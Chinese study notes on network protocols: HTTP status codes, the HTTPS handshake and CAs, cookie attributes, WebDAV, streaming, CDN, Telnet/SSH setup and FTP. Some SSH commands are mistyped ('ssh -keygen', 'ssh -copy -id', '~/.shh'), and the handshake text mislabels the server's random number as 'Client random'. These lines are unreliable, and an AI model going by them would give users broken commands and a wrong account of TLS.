| 205  | 重置内容（Reset Content）                   | 服务器成功处理了请求，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域 |
| 206  | 部分内容（Partial Content）                 | 服务器成功处理了部分 GET 请求                                |

##### HTTP状态返回代码 3xx （重定向）

> 表示要完成请求，需要进一步操作。通常，这些状态代码用来重定向。

| Code | 代码                             | 说明                                                         |
| ---- | -------------------------------- | ------------------------------------------------------------ |
| 300  | 多种选择（Multiple Choices）     | 针对请求，服务器可执行多种操作。服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 |
| 301  | 永久移动（Moved Permanently）    | 请求的网页已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。今后任何新的请求都应使用新的URI代替 |
| 302  | 临时移动（Found）                | 与301类似。但资源只是临时被移动，客户端应继续使用原有URI。服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 |
| 303  | 查看其它位置（See Other）        | 与301类似，请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 |
| 304  | 未修改（Not Modified）           | 自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 |
| 305  | 使用代理（Use Proxy）            | 请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。 |
| 306  | 已弃用                           |                                                              |
| 307  | 临时重定向（Temporary Redirect） | 与302类似，服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 |

##### HTTP状态返回代码 4xx（请求错误）

客户端错误，请求包含语法错误或无法完成请求。这些状态代码表示请求可能出错，妨碍了服务器的处理。

| Code | 代码                                                  | 说明                                                         |
| ---- | ----------------------------------------------------- | ------------------------------------------------------------ |
| 400  | 错误请求（Bad Request）                               | 客户端请求的语法错误，服务器不理解请求的语法。               |
| 401  | 未授权（Unauthorized）                                | 请求要求身份验证。对于需要登录的网页，服务器可能返回此响应。 |
| 402  | Payment Required                                      | 保留，将来使用                                               |
| 403  | 禁止（Forbidden）                                     | 服务器理解请求客户端的请求，但是拒绝执行此请求               |
| 404  | 未找到（Not Found）                                   | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置"您所请求的资源无法找到"的个性页面 |
| 405  | 方法禁用（Method Not Allowed）                        | 客户端请求中的方法被禁止                                     |
| 406  | 不接受（Not Acceptable）                              | 服务器无法根据客户端请求的内容特性完成请求                   |
| 407  | 需要代理授权（Proxy Authentication Required）         | 请求要求代理的身份认证，此状态代码与401（未授权）类似，但指定请求者应当授权使用代理。 |
| 408  | 请求超时（Request Time-out）                          | 服务器等待客户端发送的请求时间过长，超时                     |
| 409  | 冲突（Conflict）                                      | 服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。（服务器完成客户端的 PUT 请求时可能返回此代码） |
| 410  | 已删除（Gone）                                        | 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 |
| 411  | 需要有效长度（Length Required）                       | 服务器不接受不含有效内容长度标头字段（Content-Length）的请求 |
| 412  | 未满足前提条件（Precondition Failed）                 | 服务器未满足请求者在请求中设置的其中一个前提条件。（客户端请求信息的先决条件错误） |
| 413  | 请求实体过大（Request Entity Too Large）              | 由于请求实体过大，超出服务器的处理能力，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 |
| 414  | 请求的URI过长（Request-URI Too Large）                | 请求的URI（通常为网址）过长，服务器无法处理。                |
| 415  | 不支持的媒体类型（Unsupported Media Type）            | 服务器无法处理请求附带的媒体格式（请求的格式不受请求页面的支持） |
| 416  | 请求范围不符合要求（Requested range not satisfiable） | 如果页面无法提供请求的范围，则服务器会返回此状态代码。（客户端请求的范围无效） |
| 417  | 未满足期望值（Expectation Failed）                    | 服务器未满足”期望”请求标头字段（Expect）的要求。             |

##### HTTP状态返回代码 5xx（服务器错误）

这些状态代码表示服务器在尝试处理请求时发生内部错误。这些错误可能是服务器本身的错误，而不是请求出错。

| Code | 代码                                           | 说明                                                         |
| ---- | ---------------------------------------------- | ------------------------------------------------------------ |
| 500  | 服务器内部错误（Internal Server Error）        | 服务器遇到错误，无法完成请求。                               |
| 501  | 尚未实施（Not Implemented）                    | 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。 |
| 502  | 错误网关（Bad Gateway）                        | 服务器作为网关或代理尝试执行请求时，从上游服务器收到无效响应。 |
| 503  | 服务器不可用（Service Unavailable）            | 服务器目前无法使用（由于超载或停机维护）。服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 |
| 504  | 网关超时（Gateway Time-out）                   | 服务器作为网关或代理，但是没有及时从上游服务器获取请求。     |
| 505  | HTTP版本不受支持（HTTP Version not supported） | 服务器不支持请求中所用的HTTP协议版本。                       |



#### 2.6.5.2  HTTPS

##### 简介

HTTPS (HyperText Transfer Protocol over Secure Socket Layer) 可以理解为 HTTP+SSL/TLS，即 HTTP下加入 SSL 层，HTTPS 的安全基础是 SSL。

HTTPS 是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性。HTTPS 在HTTP 的基础上加入SSL层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要SSL。HTTPS 存在不同于 HTTP 的默认端口及一个加密/身份验证层（在 HTTP与 TCP之间）。

HTTPS 协议是由 HTTP 加上TLS/SSL协议构建的可进行加密传输、身份认证的网络协议，主要通过数字证书、加密算法、非对称密钥等技术完成互联网数据传输加密，实现互联网传输安全保护。**设计目标**主要有三个：

（1）**数据保密性**：保证数据内容在传输的过程中不会被第三方查看。就像快递员传递包裹一样，都进行了封装，别人无法获知里面装了什么。

（2）**数据完整性**：及时发现被第三方篡改的传输内容。就像快递员虽然不知道包裹里装了什么东西，但他有可能中途掉包，数据完整性就是指如果被掉包，我们能轻松发现并拒收。

（3）**身份校验安全性**：保证数据到达用户期望的目的地。就像我们邮寄包裹时，虽然是一个封装好的未掉包的包裹，但必须确定这个包裹不会送错地方，通过身份校验来确保送对了地方。

##### http的优缺点

使用明文传输，容易被中间人攻击。消息完整性检测不足（仅在头部包含了本次传输数据的长度，内容未验证）。

##### https的优缺点

**缺点**

1. 相同网络环境下，HTTPS 协议会使页面的加载时间延长近 50%，增加 10%到 20%的耗电。此外，HTTPS 协议还会影响缓存，增加数据开销和功耗。
2. HTTPS协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持等方面几乎起不到什么作用。

3. 最关键的是，SSL证书的信用链体系并不安全。特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。

4. 成本增加。部署HTTPS后，因为HTTPS协议的工作要增加额外的计算资源消耗，例如SSL协议加密算法和SSL交互次数将占用一定的计算资源和服务器成本。在大规模用户访问应用的场景下，服务器需要频繁地做加密和解密操作，几乎每一个字节都需要做加解密，这就产生了服务器成本。

**优点**

1. 使用HTTPS协议可认证用户和服务器，确保数据发送到正确的客户机和服务器。
2. HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比HTTP协议安全，可防止数据在传输过程中被窃取、改变，确保数据的完整性。

3. HTTPS是现行架构下最安全的解决方案，虽然不是绝对安全，但它大幅增加了中间人攻击的成本。

##### HTTPS过程

**1.四次握手**：

- Client Hello：当客户端连接到支持TLS协议的服务器时，要求创建安全连接并给出受支持的密码组合（支持的协议版本、加密密码算法和加密哈希函数、**随机数1**（Client random）），握手开始。

- Server Hello、Certificate、ServerkeyExchange、Server Hello Done：服务器从列表中选择加密方法，**随机数2**（Client random），连同数字证书，此证书通常包含服务器的名称、受信任的证书颁发机构（CA）和服务器的**公钥**，发给客户端。

- Client Key Exchange、Change Cipher Spec、Encrypted Handshake Message：客户端确认其颁发的证书的有效性，**使用服务器的公钥**加密**随机数3**（Premaster secret）生成的**密钥**，并将其发送到服务器
- 服务器使用自己的**私钥**解密**密钥**，获得随机数3（Premaster secret）。

利用前面的**3个随机数**，双方生成用于加密和解密的**对称/会话密钥**（session key）。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514145243068.png" alt="image-20220514145243068" style="zoom:50%;" />

这就是TLS协议的握手，握手完毕后的连接是安全的，直到连接（被）关闭。如果上述任何一个步骤失败，TLS握手过程就会失败，并且断开所有的连接。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514145330875.png" alt="image-20220514145330875" style="zoom: 67%;" />

**2.证书验证阶段**

-   浏览器发起 HTTPS 请求

-   服务端返回 HTTPS 证书
-   **其中证书包含：**
    -   颁发机构信息
    
    -   公钥
    
    -   公司信息
    
    -   域名
    
    -   有效期
    
    -   指纹

-   客户端验证证书是否合法，如果不合法则提示告警

**3.数据传输阶段**

-   当证书验证合法后，在本地生成随机数

-   通过公钥加密随机数，并把加密后的随机数传输到服务端

-   服务端通过私钥对随机数进行解密

-   服务端通过客户端传入的随机数构造对称加密算法，对返回结果内容进行加密后传输

##### CA证书

CA (Certificate Authority) 是颁发数字证书的机构。是负责签发，认证，管理已颁发证书的权威机构，并作为电子商务交易中受信任的第三方，承担公钥体系中公钥的合法性检验的责任。CA拥有一个证书（内含公钥和私钥），网上的公众用户通过验证CA的签字从而信任CA，任何人都可以得到CA的证书（含公钥），用以验证它所签发的证书。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514145650809.png" alt="image-20220514145650809" style="zoom: 67%;" />

如果用户想得到一份属于自己的证书，他应先向 CA 提出申请。在 CA 判明申请者的身份后，便为他分配一个公钥，并且 CA 将该公钥与申请者的身份信息绑在一起，并为之签字后，形成证书发给申请者。

如果一个用户想鉴别另一个证书的真伪，他就用 CA 的公钥对那个证书上的签字进行验证，一旦验证通过，该证书就被认为是有效的。

##### HTTPS真的安全吗???

哪些CA的公钥可以被认可这件事情，是由操作系统为你做的，操作系统在安装的时候会内置可信CA的列表。

Windows系统，Win+R，输入certmgr.msc，可查看系统自带证书。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514145841857.png" alt="image-20220514145841857" style="zoom:50%;" />

浏览器证书（以CSDN为例)

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514150036592.png" alt="image-20220514150036592" style="zoom:50%;" />

在网络安全专栏中有关于xss攻击和csrf攻击的文章，XSS利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任，信任链必然有一个根结点，如果什么都不信任，也就没办法通信，而HTTPS则是信任CA、操作系统、浏览器，所以，下载正版的操作系统、浏览器可以相对安全（为什么说相对呢？谁知道Windows会不会摆你一道，比如，斯诺登事件）。

##### HTTPS[抓包](https://so.csdn.net/so/search?q=抓包&spm=1001.2101.3001.7020)与修改（工具）

[**1.开发者神器库**](https://blog.csdn.net/xiaohxx/article/details/84994617)

上方链接不是官网，是该开发者的CSDN中关于开发者神器库的文章，里面有官网、软件等。

实战：进行百度主页的篡改，和CSDN的篡改。[教程](https://blog.csdn.net/lady_killer9/article/details/107882912)

[**2.Fiddler**](https://www.telerik.com/fiddler)

##### 参考链接

-   [How does HTTPS work? What's a CA? What's a self-signed Certificate?](https://www.youtube.com/watch?v=T4Df5_cojAs)
-   [SSL, TLS, HTTP, HTTPS Explained](https://www.youtube.com/watch?v=hExRDVZHhig)

#### 2.6.5.4  Cookie

##### 简介

Cookie（复数形态 Cookies），类型为「小型文本文件」，指某些网站为了辨别用户身份，进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。HTTP**无状态协议**，服务器**用cookies保持用户状态**。

##### Cookie的组件

- HTTP在响应的首部行里使用一个关键字头set-cookie：选择的cookie号具有唯一性

- 后继的HTTP请求中使用服务器响应分配的cookie：

- Cookie文件保存在用户的主机中，内容是服务器返回的一些附加信息，由用户主机中的浏览器管理

- Web服务器建立后端数据库，记录用户信息，cookie作为关键字

  例如：Set-Cookie: SID=31d4d96e407aad42; Path=/; Domain=example.com

  Cookie: SID=31d4d96e407aad42

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604181504565.png" alt="image-20220604181504565" style="zoom: 33%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604181538884.png" alt="image-20220604181538884" style="zoom: 50%;" />

##### 属性

**Cookies一般包含5个字段**

- 域指明Cookie来自何方，每个域为每个客户分配Cookie有数量限制
- 路径标明服务器的文件树中哪些部分可以使用该Cookie
- 内容采用“名字=值”的形式，是Cookie存放内容的地方，可以达到4K容量，内容只是字符串，不是可执行程序
- 安全指示浏览器只向使用安全传输连接的服务器返回Cookie

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604181810646.png" alt="image-20220604181810646" style="zoom: 50%;" />

**name（cookie 的名称）**

**value**

cookie的值。

**expires**

- 当 Expires 属性缺省时，表示是会话性 Cookie，在用户关闭浏览器时失效。

**max-age**

max-age 可以为正数、负数、0。如果 max-age 属性为正数时，浏览器会将其持久化，当 max-age 属性为负数，则表示该 Cookie 只是一个会话性 Cookie。当 max-age 为 0 时，则会立即删除这个 Cookie。Expires 和 max-age 都存在的条件下，max-age 优先级更高。

**domain**

指定 Cookie 的域名，默认是当前域名。domain 设置时可以设置为自身及其父域，子域可以访问父域的Cookie，反之不能。

**path**

指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送对应的 Cookie。

**secure**

只能通过HTTPS传输。

**httponly**

限制Cookie仅在HTTP传输过程中被读取，一定程度上防御XSS攻击。

**SameSite**

SameSite 支持 Strict / Lax / None 三种值。Strict 最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。Lax 允许部分第三方请求携带 Cookie，主要是链接、预加载、GET 表单三种情况。 Cookie 的 SameSite 属性为 None ， 设置了 Secure 时，无论是否跨站都会发送 Cookie。

##### Cookie技术的优缺点

1.Cookie技术是把双刃剑，能分析用户喜好，向用户进行个性化推荐

- 用Cookie在某网站标识用户信息，查找用户以前浏览网站记录
- 用Cookie记录用户购物清单
- 用Cookie可以保存4K内容，跟踪用户浏览网站的喜好
- 用Cookie跨站点跟踪用户点击广告

2.Cookie技术是把双刃剑，也能跟踪用户网络浏览痕迹，泄露用户隐私

- Cookie跟踪用户以前浏览过哪些网站，跟踪用户频繁浏览哪类网站
- Cookie收集用户信息，用户网络交互时关注的关键词

3.Cookie容易嵌入间谍程序，这是个误区，Cookie文件保存的只是文本串，没有可执行程序

- 用户可以设置浏览器限制使用Cookie

#### 2.6.5.5  WebDAV

##### 简介

WebDAV （Web-based Distributed Authoring and Versioning）一种基于HTTP 1.1协议的通信协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定、解锁，以及版本控制等功能。

**支持的方法具体为：**

-   ###### OPTIONS

    -   获取服务器的支持

-   ###### GET / PUT / POST / DELETE

    -   资源操作

-   ###### TRACE

    -   跟踪服务器

-   ###### HEAD

-   ###### MKCOL

    -   创建集合

-   ###### PROPFIND / PROPPATCH

-   ###### COPY / MOVE

-   ###### LOCK / UNLOCK

##### 相关CVE

-   **CVE-2015-1833**
    -   Apache Jacrabbit WebDav XXE
    
    -   <http://www.securityfocus.com/archive/1/535582>
    
-   **CVE-2015-7326**
-   Milton WebDav XXE
    
-   <http://www.securityfocus.com/archive/1/536813>

#### 2.6.5.6 参考链接

##### RFC

-   [RFC 1738](https://tools.ietf.org/html/rfc1738) URL
-   [RFC 1945](https://tools.ietf.org/html/rfc1945) HTTP 1.0
-   [RFC 2068](https://tools.ietf.org/html/rfc2068) HTTP 1.1
-   [RFC 3253](https://tools.ietf.org/html/rfc3253) Versioning Extensions to WebDAV (Web Distributed Authoring and Versioning)
-   [RFC 3648](https://tools.ietf.org/html/rfc3648) Web Distributed Authoring and Versioning (WebDAV) Ordered Collections Protocol
-   [RFC 3744](https://tools.ietf.org/html/rfc3744) Web Distributed Authoring and Versioning (WebDAV) Access Control Protocol
-   [RFC 4437](https://tools.ietf.org/html/rfc4437) Web Distributed Authoring and Versioning (WebDAV) Redirect Reference Resources
-   [RFC 4918](https://tools.ietf.org/html/rfc4918) HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV)
-   [RFC 5323](https://tools.ietf.org/html/rfc5323) Web Distributed Authoring and Versioning (WebDAV) SEARCH
-   [RFC 5842](https://tools.ietf.org/html/rfc5842) Binding Extensions to Web Distributed Authoring and Versioning (WebDAV)

##### Blog

-   [What should a hacker know about WebDav](http://2015.zeronights.org/assets/files/35-Egorov.pdf)

-   [Cookie 的 SameSite 属性](http://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html)

-   [HTTP 协议入门](http://www.ruanyifeng.com/blog/2016/08/http.html)

### 2.6.6 流媒体

#### 2.6.6.1 概述

**流媒体概念**

- 连续媒体（音视频）经压缩编码、数据打包后，经过网络发送给接收方
- 接收方对数据进行重组、解码和播放

**流媒体的特性**

- 端到端时延约束
- 时序性约束：流媒体数据必须按照一定的顺序连续播放
- 具有一定程度的容错性：丢失部分数据包也可完成基本功能

**流媒体面临的挑战**

- 约束条件：网络特性（带宽有限、动态变化、延迟与抖动、丢失、异构性）
- 目标：流媒体服务质量要素（画质、启动延迟、平滑、交互性）
- 如何在“尽力服务”的网络传输条件下获得良好的视频质量？

#### 2.6.6.2 流媒体动态自适应传输

DASH(Dynamic Adaptive Streaming over HTTP)

- 动态自适应流媒体传输协议DASH，由MPEG组织制定的标准
- 类似协议：苹果HTTP Live Streaming（HLS）； Adobe的HTTP Dynamic Streaming（HDS）；微软的Microsoft Smooth Streaming

DASH基本思想

- 完整视频被拆分为固定时长 (2s-10s) 的视频片段(segment)， 每段提供不同码率
- 视频片段与其对应的元文件（URL）一同存放于DASH服务器
- 客户端基于网络条件、缓冲大小等，对每个视频片段，自适应选择合适的视频码率来下

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604183457988.png" alt="image-20220604183457988" style="zoom:50%;" />

DASH中普遍使用的自适应码率ABR（Adaptive bitrate）

### 2.6.7 内容分发网络CDN

#### 2.6.7.1 概述

内容分发网络CDN

- Content Delivery Network，or Content Distribution Network

基本思想源于MIT对Web服务瞬间拥塞问题的解决（1998）

- 一种Web缓存系统，**靠近网络边缘（用户）提供内容服务**
- 目前提供更丰富的服务，包括静态内容、流媒体、用户上传视频等

**主要优点**

- 降低响应时延，避免网络拥塞
- 避免原始服务器过载及防止DDoS攻击
- 分布式架构，具有良好的可扩展性
- 对用户透明，无需用户感知

#### 2.6.7.2 关键问题

怎样将内容（如从百万的视频中选定的内容）分发给同时发起访问的数百万用户？

#### 2.6.7.3 机理与解决方式

##### DNS重定向实现CDN

- 将请求调度到较近或负载较轻的CDN服务器

- HTTP重定向请求内容，服务提供者返回清单CDN

  - 原始服务器决策CDN服务器

  - HTTP响应：状态码30X，Location：指明新的位置

##### DNS辅助实现CDN

- 负载均衡DNS负责决策CDN服务器选择
- 负载均衡DNS需要收集CDN服务器的位置和负载情况
- 如果找不到被请求的对象，需要从原始服务器获取

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604183939766.png" alt="image-20220604183939766" style="zoom:50%;" />



### 2.6.8 Telnet协议与SSH协议

[Telnet协议与SSH协议详解（CSDN）](https://blog.csdn.net/lady_killer9/article/details/110875191)

注：使用MobaXterm软件来进行远程连接

#### 2.6.8.1 Telnet远程登录

##### 简介

Telnet(telecommunication network protocol，电信网络协议)，是一个简单的**远程终端协议**，使用端口23。用户用Telnet就可在其所在地通过**TCP**连接注册（即登录）到远地的另一台主机上（使用主机名或IP地址）。Telnet能将用户的击键传到远地主机，同时也能将远地主机的输出通过TCP连接返回到用户屏幕。这种服务是透明的，因为用户感觉到好像键盘和显示器是直接连在远地主机上。因此，Telnet又称为**终端仿真协议**。

##### 工作原理

Telnet也使用**客户/服务器**方式。在本地系统运行Telnet客户进程，而在远地主机则运行Telnet服务器进程。和[FTP](https://blog.csdn.net/lady_killer9/article/details/110817936)的情况相似，服务器中的主进程等待新的请求，并产生从属进程来处理每一个连接。
Telnet能够适应许多计算机和操作系统的差异。例如，对于文本中一行的结束，有的系统使用ASCII码的回车（CR），有的系统使用换行（LF），还有的系统使用两个字符，回车-换行（CR-LF）。又如，在中断一个程序时，许多系统使用Control-C（C)，但也有系统使用ESC按键。为了适应这种差异，Telnet定义了数据和命令应怎样通过互联网。这些定义就是所谓的**NVT(Network Virtual Terminal，网络虚拟终端)**。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604180943647.png" alt="image-20220604180943647" style="zoom:50%;" />

客户软件把用户的击键和命令转换成NVT格式，并送交服务器。服务器软件把收到的数据和命令从NVT格式转换成远地系统所需的格式。向用户返回数据时，服务器把远地系统的格式转换为NVT格式，本地客户再从NVT格式转换到本地系统所需的格式。

NVT的格式定义很简单：所有的通信都使用8位（一个字节）。在运转时，NVT使用7位ASCII 码传送数据，而当高位置1时用作控制命令。ASCII码共有95个可打印字符（如字母、数字、标点符号）和33个控制字符。所有可打印字符在NVT中的意义和在ASCII码中一样。但NVT只使用了ASCII码的控制字符中的几个。此外，NVT还定义了两字符的CR-LF为标准的行结束控制符。当用户键入回车按键时，Telnet的客户就把它转换为CR-LF再进行传输，而Telnet服务器要把CR-LF转换为远地机器的行结束字符。

Telnet的**选项协商（Option Negotiation）机制**使Telnet客户和Telnet服务器可商定使用更多的终端功能，协商的双方是平等的，也就是说任何一方都可以主动发送选项协商请求给对方。

选项协商6种情况如下表所示：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514154347706.png" alt="image-20220514154347706" style="zoom:50%;" />

1. WILL：发送方本身将激活（enable)选项。
2. DO：发送方想叫接收端激活选项。
3. WONT:发送方本身想禁止选项。
4. DON'T：发送方想让接收端去禁止选项。

注：由于Telnet规则规定，对于激活选项请求（如1和2），有权同意或者不同意。而对于使选项失效请求（如3和4），必须同意。这样，4种请求就会组合出6种情况，如上表所示。

##### 安全性

不安全，因为使用**明文传输**。一旦被ARP中毒等中间人攻击，就会暴露用户名、密码等敏感信息。另外，账号密码简单时也可被暴力破解。

#### 2.6.8.2 SSH

##### 简介

SSH(Secure Shell)，由 IETF 的网络小组（Network Working Group）所制定，端口22。SSH 为建立在应用层基础上的安全协议。SSH 是较可靠的，专为**远程登录会话**和其他网络服务**提供安全性**的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台，几乎所有UNIX平台都可使用。

通过使用SSH，你可以把所有传输的数据进行加密，这样"中间人"这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的"通道" 。

**22端口由来小故事**：SSH设计者Tatu Ylonen设计SSH是为了替代telnet（端口23）和ftp（端口21），端口22在当时是空闲的，正好就在telnet和ftp的端口之间，他感觉这个端口号天然就带有可信度光环。于是就选择了端口22作为SSH的端口。原文可查看[ssh-端口](https://www.ssh.com/ssh/port)。

另外，Tatu Ylonen于1995年写的SSH，W·Richard Stevens 于1994年写的《TCP/IP详解卷I》，所以里面只有Telnet，而没有SSH。可以阅读RFC4250进行更详细的了解。

OpenSSH是SSH协议的免费开源实现，OpenSSH提供了服务端的程序(openssh-server)和客户端工具(openssh-client)，接下来以OpenSSH为例，介绍一下SSH命令及高级配置

##### 安装与开启服务

```shell
#安装服务端/客户端(Ubuntu)
$ sudo apt install openssh-server/openssh-client

#安装服务端/客户端(Centos)
$ sudo yum install openssh-server/openssh-client

#查看ssh服务是否开启
$ netstat -tlp | grep ssh

#启动/停止/重启 ssh服务
$ sudo /etc/init.d/ssh start/stop/restart
```

查看ssh服务是否开启

![image-20220514154834416](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514154834416.png)

##### 命令

![image-20220514154853434](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514154853434.png)

###### SSH命令

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514155024015.png" alt="image-20220514155024015" style="zoom:67%;" />

版本等信息

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514155104042.png" alt="image-20220514155104042" style="zoom:50%;" />

注意

- user是远程服务器登录的用户名，默认为当前用户

- hostname是远程服务器地址，可以是IP/域名/别名
- exit/logout命令均可退出当前登录

接下来，展示一下连接ssh服务器

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514162340867.png" alt="image-20220514162340867" style="zoom:50%;" />

可以看到，使用**SHA256进行了校验**，生成了一个指纹，我们关闭连接，重连一次。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514162438218.png" alt="image-20220514162438218" style="zoom:67%;" />

再次连接，可以发现，已经没有了校验显示，输入密码后直接登录，稍微简便了一点。那么，校验记录存在哪呢？

```shell
cd ~/.shh
cat known_hosts
```

![image-20220514162550980](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514162550980.png)

第一条是我的GitLab的，就划掉了，第二条是刚才连接的。

![image-20220514162629222](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514162629222.png)

在~/.ssh/known_hosts文件中可以看到。接下来，我们就来详细看看一些配置。

##### 高级配置

Linux下，ssh配置信息都保存在~/.ssh 中

配置文件	作用
known_hosts	作为客户端。记录曾连接服务器授权。ssh第一次连接一台服务器会有一个授权提示，确认授权后会记录在此文件中，下次连接记录中的服务器时则不再需要进行授权确认提示
authorized_keys	作为服务端。客户端的免密连接公钥文件
config	作为客户端。记录连接服务器配置的别名
后两个默认是不存在的，需要手动创建。下面Windows中也是仅有known_hosts文件的，另外两个是我给GitLab配置密钥文件时创建的。

Windows下

Windows下内容

###### 服务器别名

每次都写IP地址，但是IP地址比较难记，我们可以去一个别名。新建一个config文件，内容如下：

Host Ubuntu
  HostName 10.28.214.174
  User llvm
  Port 22


config文件
其中，Port可以不写，默认就是22端口。

别名登录

###### 免密登录

通过以上，我们即可通过别名和密码登录了，但是每次都输入密码，比较麻烦，接下来我们看看免密登录。

客户端生成密钥对

```shell
ssh -keygen
```

参数
 我一般是不用参数的，它会给一些提示，我一般全部按Enter，选择默认，这次由于文件路径名字重复，才改了一个。上面的参数，博主只感觉-t参数比较有用，但是密码学学的也不好，默认的rsa加密方式也很好，一般也是默认。


生成密钥文件

查看密钥文件
上传公钥到服务器

```shell
ssh -copy -id user@hostname
```

windows下没有这个命令，只能手动了。使用这个命令其实是将公钥追加到了服务器的authroized_keys文件中，我们把文件放到Ubuntu中，使用命令追加一下。

公钥上传成功
接下来，我们就可以使用密钥文件登录了

```shell
ssh -i id_rsa_ubuntu Ubuntu
```

密钥文件登录
还是有点麻烦，需要记着服务器需要使用哪个对应的私钥。我们再配置一下，添加私钥文件：

```shell
IdentityFile C:\Users\DELL\.ssh\id_rsa_ubuntu
```

配置密钥文件
好啦，至此，我们可以只是用一个别名就能登录了：


ssh Ubuntu即可登录，无需密码
当然，我们只是为了学习一下ssh，平时博主也直接使用MobaXterm、Xshell等软件直接连接，有工具的话会节省很多时间。

对于GitHub、GitLab等也会使用密钥文件的方式，将公钥上传到服务器即可。


GitLab上传页面
以GitLab为例，可以看到，要求上传ssh-rsa或ssh-ed25519的公钥。客户端生成密钥对时，可以使用-t参数，选择ed25519，也可使用默认的rsa方式。

##### 安全性

1. 有效防止远程管理过程中的信息泄漏
2. 传输**数据加密**，能够防止DNS和IP欺骗
3. 传输**数据压缩**，加快传输速度

账号密码简单时也可被暴力破解。

关于这两个协议的安全实验，将在学习暴力破解的时候再展示。

#### 2.6.8.3 参考

《计算机网络第7版 谢希仁》6.3

《TCP/IP详解I》第26章

[RFC854](https://datatracker.ietf.org/doc/rfc854/)

[RFC4250](https://datatracker.ietf.org/doc/rfc4250/)

www.ssh.com

### 2.6.9 FTP协议与TFTP协议

[网络-FTP协议与TFTP协议](https://blog.csdn.net/lady_killer9/article/details/110817936)

#### 2.6.9.1 TFTP

TFTP（Trivial File Transfer Protocol，简单文件传送协议)，它是一个很小且易于实现的文件传送协议。TFTP使用客户/服务器方式，但它使用UDP数据报，因此TFTP需要有自己的差错改正措施。TFTP只支持文件传输而不支持交互。TFTP没有一个庞大的命令集，没有列目录的功能，也不能对用户进行身份鉴别。

TFTP的主要特点是：
（1）每次传送的数据报文中有**512字节**的数据，但最后一次可不足512字节。
（2）数据报文按序编号，从1开始。
（3）支持ASCII码或二进制传送。
（4）可对文件进行读或写。
（5）使用很简单的首部。

#### 2.6.9.2 FTP

##### 简介

FTP（File Transfer Protocol，文件传送协议)是互联网上使用得最广泛的文件传送协议。

FTP协议的**特点**：

- FTP使用**TCP**实现可靠传输，采用**客户/服务器模式**
- FTP提供交互式的访问，允许客户指明文件的类型与格式（如指明是否使用ASCII码），并允许文件具有存取权限（如访问文件的用户必须经过授权，并输入有效的口令）
- FTP屏蔽了各计算机系统的细节，因而适合于在**异构网络中任意计算机之间传送文件**。

FTP协议的**目标**是：

- 促进文件(计算机程序和/或数据)的共享

- 鼓励间接或通过程序使用远程计算机
- 保护用户免受主机之间文件存储系统的变化
- 可靠有效地传输数据

一般我们熟知的都是21端口，还有以下分类：

**主动FTP（PORT）：**
   　　命令连接：客户端 >1023端口 -> 服务器 21端口
   　　数据连接：客户端 >1023端口 <- 服务器 20端口 

**被动FTP（PASV)：**
